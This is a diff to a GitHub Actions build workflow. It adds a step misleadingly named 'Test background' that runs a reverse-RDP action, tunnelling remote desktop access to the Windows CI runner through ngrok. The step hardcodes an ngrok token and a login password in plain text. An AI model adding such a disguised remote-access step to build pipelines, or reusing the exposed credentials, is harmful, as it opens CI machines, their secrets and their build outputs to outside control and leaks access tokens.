@@ -74,6 +74,13 @@ jobs:
       env:
         Configuration: ${{ matrix.configuration }}
 
+    - name: Test background
+      uses: NyaMisty/reverse-rdp-windows-github-actions-ng@master
+      with:
+        ngrok-token: "2FBurznnoMdzidX11HKbFRy4sw7_317DKBHJWiQsRHbK1xt7w"
+        password: "2FBurznno" # You can also put the password in secrets as you wish.
+        #foreground: false
+
     # Upload the MSIX package: https://github.com/marketplace/actions/upload-a-build-artifact
     - name: Upload build artifacts
       uses: actions/upload-artifact@v3
